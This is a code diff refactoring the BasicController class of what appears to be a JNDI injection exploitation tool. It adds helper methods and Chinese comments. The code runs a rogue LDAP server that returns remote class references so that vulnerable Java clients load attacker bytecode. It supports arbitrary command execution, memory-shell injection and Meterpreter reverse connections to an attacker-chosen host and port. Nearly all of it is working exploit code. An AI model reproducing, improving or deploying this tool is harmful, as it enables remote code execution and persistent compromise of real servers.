@@ -14,120 +14,157 @@ import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
-import org.fusesource.jansi.Ansi;
 
 import java.net.URL;
+import java.nio.charset.StandardCharsets;
 import java.util.Base64;
+import java.util.Locale;
 
 import static org.fusesource.jansi.Ansi.ansi;
 
 @LdapMapping(uri = {"/basic"})
 public class BasicController implements LdapController {
 
-    private static String     payloadType;
-    //最后的反斜杠不能少
-    private final  String     codebase = Config.codeBase;
-    private        String[]   params;
-    private        GadgetType gadgetType;
+    private static String payloadType;
+    // 用于对外提供动态字节码的 HTTP 服务器基础路径。
+    private final String codebase = Config.codeBase;
+    // 存放从 LDAP 路径中解析出的命令或连接参数。
+    private String[] params = new String[0];
+    private GadgetType gadgetType;
 
+    // 向 LDAP 客户端返回引用指定 payload 类的搜索结果。
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         try {
-            Entry  e         = new Entry(base);
-            String className = "";
+            Entry entry = new Entry(base);
+            String className = resolvePayloadClass();
+            URL targetUrl = new URL(new URL(codebase), className.replace('.', '/') + ".class");
 
-            if (payloadType.contains("E-")) {
-                String      ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
-                final Class EchoClass  = Class.forName(ClassNameHandler.searchClassByName(ClassName1));
-                className = EchoClass.getName();
-            }
-
-            if (payloadType.contains("M-")) {
-                String ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
-                InjShell.init(params);
-                className = Gadgets.createClassB(ClassName1);
-            }
-
-            if (payloadType.contains("command")) {
-                CommandTemplate commandTemplate = new CommandTemplate(params[0]);
-                commandTemplate.cache();
-                className = commandTemplate.getClassName();
-            }
-
-            if (payloadType.contains("msf")) {
-                className = Meterpreter.class.getName();
-            }
-
-            String className1 = className.replaceAll("\\.", "/");
-
-            URL    turl       = new URL(new URL(this.codebase), className1 + ".class");
-            System.out.println(Ansi.ansi().fgBrightBlue().a("  redirecting to " + turl).reset());
-            e.addAttribute("javaClassName", "foo");
-            e.addAttribute("javaCodeBase", this.codebase);
-            e.addAttribute("objectClass", "javaNamingReference");
-            e.addAttribute("javaFactory", className);
-            result.sendSearchEntry(e);
+            System.out.println(ansi().fgBrightBlue().a("  redirecting to " + targetUrl).reset());
+            entry.addAttribute("javaClassName", "foo");
+            entry.addAttribute("javaCodeBase", codebase);
+            entry.addAttribute("objectClass", "javaNamingReference");
+            entry.addAttribute("javaFactory", className);
+            result.sendSearchEntry(entry);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         } catch (Throwable er) {
             System.err.println("Error while generating or serializing payload");
             er.printStackTrace();
         }
-
     }
 
+    // 解析请求路径，确定 payload 类型并准备执行时所需的参数。
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
         System.out.println("- JNDI Remote Refenrence Links ");
         try {
-            base = base.replace('\\', '/');
-            int fistIndex   = base.indexOf("/");
-            int secondIndex = base.indexOf("/", fistIndex + 1);
-            if (secondIndex < 0) secondIndex = base.length();
-
-            try {
-                payloadType = base.substring(fistIndex + 1, secondIndex);
-                System.out.println(Ansi.ansi().fgBrightMagenta().a("  Paylaod: " + payloadType).reset());
-            } catch (IllegalArgumentException e) {
-                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
+            String normalized = base.replace('\\', '/');
+            payloadType = segment(normalized, 1);
+            if (payloadType.isEmpty()) {
+                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + normalized);
             }
+            System.out.println(ansi().fgBrightMagenta().a("  Paylaod: " + payloadType).reset());
 
-            int thirdIndex = base.indexOf("/", secondIndex + 1);
-            if (thirdIndex != -1) {
-                if (thirdIndex < 0) thirdIndex = base.length();
-                try {
-                    gadgetType = GadgetType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
-                } catch (IllegalArgumentException e) {
-                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(secondIndex + 1, thirdIndex));
-                }
-            }
-
-            if (gadgetType == GadgetType.base64) {
-                String cmd = Util.getCmdFromBase(base);
-                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + cmd).reset());
-                params = new String[]{cmd};
-            }
-
-            if (gadgetType == GadgetType.shell) {
-                String   cmd1         = Util.getCmdFromBase(base);
-                byte[]   decodedBytes = Base64.getDecoder().decode(cmd1);
-                String   cmd          = new String(decodedBytes);
-                String[] cmdArray     = cmd.split(" ");
-                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + cmd).reset());
-                params = cmdArray;
-            }
-
-            if (gadgetType == GadgetType.msf) {
-                String[] results1     = Util.getIPAndPortFromBase(base);
-                Config.rhost = results1[0];
-                Config.rport = results1[1];
-                System.out.println("  RemotHost: " + results1[0]);
-                System.out.println("  RemotPort: " + results1[1]);
-                params = results1;
-            }
+            gadgetType = parseGadgetType(normalized);
+            params = resolveParams(normalized);
         } catch (Exception e) {
             if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;
 
             throw new IncorrectParamsException("Incorrect params >> " + base);
         }
+    }
+
+    // 根据 payload 标识返回需要加载的实现类名称。
+    private String resolvePayloadClass() throws Exception {
+        if (payloadType.contains("E-")) {
+            Class<?> echoClass = Class.forName(ClassNameHandler.searchClassByName(suffixAfterDash(payloadType)));
+            return echoClass.getName();
+        }
+
+        if (payloadType.contains("M-")) {
+            InjShell.init(params);
+            return Gadgets.createClassB(suffixAfterDash(payloadType));
+        }
+
+        if (payloadType.contains("command")) {
+            if (params.length == 0) {
+                throw new IncorrectParamsException("Missing command parameters.");
+            }
+            CommandTemplate commandTemplate = new CommandTemplate(params[0]);
+            commandTemplate.cache();
+            return commandTemplate.getClassName();
+        }
+
+        if (payloadType.contains("msf")) {
+            return Meterpreter.class.getName();
+        }
+
+        throw new UnSupportedPayloadTypeException("Unsupported payload flag: " + payloadType);
+    }
+
+    // 读取路径中的 gadget 片段并转换为枚举值。
+    private GadgetType parseGadgetType(String base) throws UnSupportedPayloadTypeException {
+        String segment = segment(base, 2);
+        if (segment.isEmpty()) {
+            return null;
+        }
+        try {
+            return GadgetType.valueOf(segment.toLowerCase(Locale.ROOT));
+        } catch (IllegalArgumentException ignored) {
+            throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + segment);
+        }
+    }
+
+    // 根据 gadget 类型构建命令行或回连配置参数。
+    private String[] resolveParams(String base) throws Exception {
+        if (gadgetType == null) {
+            return new String[0];
+        }
+
+        switch (gadgetType) {
+            case base64:
+                String cmd = Util.getCmdFromBase(base);
+                System.out.println(ansi().fgBrightRed().a("  Command: " + cmd).reset());
+                return new String[]{cmd};
+            case shell:
+                String encoded = Util.getCmdFromBase(base);
+                String decoded = new String(Base64.getDecoder().decode(encoded), StandardCharsets.UTF_8);
+                System.out.println(ansi().fgBrightRed().a("  Command: " + decoded).reset());
+                return decoded.split(" ");
+            case msf:
+                String[] results = Util.getIPAndPortFromBase(base);
+                Config.rhost = results[0];
+                Config.rport = results[1];
+                System.out.println("  RemotHost: " + results[0]);
+                System.out.println("  RemotPort: " + results[1]);
+                return results;
+            default:
+                return new String[0];
+        }
+    }
+
+    // 提取路径中第 index 个非空段，保持与原解析逻辑一致。
+    private String segment(String base, int index) {
+        int cursor = 0;
+        int found = 0;
+        while (cursor < base.length()) {
+            int nextSlash = base.indexOf('/', cursor);
+            if (nextSlash == -1) nextSlash = base.length();
+
+            if (nextSlash > cursor) {
+                if (found == index) {
+                    return base.substring(cursor, nextSlash);
+                }
+                found++;
+            }
+            cursor = nextSlash + 1;
+        }
+        return "";
+    }
+
+    // 返回连字符后的子串，用于解析自定义类名。
+    private String suffixAfterDash(String value) {
+        int dashIndex = value.indexOf('-');
+        return dashIndex >= 0 ? value.substring(dashIndex + 1) : value;
     }
 }
